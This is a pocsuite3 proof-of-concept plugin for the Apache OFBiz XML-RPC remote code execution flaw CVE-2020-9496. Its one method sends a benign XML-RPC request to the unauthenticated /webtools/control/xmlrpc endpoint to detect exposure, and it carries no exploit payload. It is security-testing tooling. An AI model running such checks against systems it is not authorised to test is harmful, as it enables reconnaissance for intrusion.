"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit http://pocsuite.org
"""
from collections import OrderedDict

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptDict, VUL_TYPE


class DemoPOC(POCBase):
    vulID = ''  # ssvid
    version = '1.0'
    author = ['ajatar']
    vulDate = '2020-09-29'
    createDate = '2020-10-12'
    updateDate = '2020-10-12'
    references = ['https://xz.aliyun.com/t/8324']
    name = 'Apache Ofbiz XMLRPC RCE CVE-2020-9496'
    appPowerLink = 'https://downloads.apache.org/ofbiz/'
    appName = 'apache-ofbiz'
    appVersion = '< 17.12.04'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''Apache ofbiz 存在 反序列化漏洞，攻击者 通过 访问未授权接口，构造特定的xmlrpc http请求，可以造成 远程代码执行的影响。'''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    pocDesc = ''''''


    def _verify(self):
        result = {}
        if '/' == self.url[-1]:
            url = self.url
        else:
            url = self.url + '/'
        url = url + 'webtools/control/xmlrpc'
        headers = {'Content-Type': 'application/xml'}
        payload = "<?xml version=\"1.0\"?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value>dwisiswant0</value></param></params></methodCall>"
        r = requests.post(url,data=payload,headers=headers)
        if 'faultString' in r.text and 'No such service [ProjectDiscovery]' in r.text and 'methodResponse' in r.text:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = url
            result['VerifyInfo']['Postdata'] = payload

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
